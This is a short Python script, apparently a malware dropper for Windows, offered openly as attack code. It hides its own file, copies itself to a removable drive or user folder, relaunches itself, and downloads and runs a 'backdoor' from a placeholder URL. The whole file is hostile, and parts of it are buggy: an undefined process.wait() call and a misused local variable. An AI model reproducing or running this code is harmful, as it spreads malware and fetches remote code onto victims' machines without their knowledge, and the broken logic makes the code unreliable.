import os
import sys
import shutil
import getpass
import subprocess as sp
import win32con, win32api
from urllib.request import urlopen

user = getpass.getuser()
name = sys.argv[0]
fullname = os.path.abspath(name)

def run(s):
  sp.Popen(s, shell=True)
  process.wait()

def hide():
  setAttr = win32api.SetFileAttributes
  hidden = win32con.FILE_ATTRIBUTE_HIDDEN
  setAttr(name, hidden)

def copy():
  isdir = os.path.isdir

  if(isdir("E:\\")):
    dst = "E:\\" + name

  elif(isdir("C:\\Users\\%s\\" % user)):
    dst = "C:\\Users\\%s\\%s" % (user, name)

  elif(isdir("/home/%s/Downloads/" % user)):
    dst="/home/%s/Downloads/%s" % (user, name)
  
  else:
    dst = fullname

  shutil.copyfile(fullname, dst)
  fullname = dst

def dl_backdoor(url):
  n = url.split('/')[-1]
  n = n.split('?')[0]
  n = n.split('#')[0]

  d = urlopen(url).read()
  f = open(n, "wb")
  f.write(d)
  f.close()

  run(os.path.abspath(n))

hide()
copy()
run(fullname)
dl_backdoor('http://xxx')
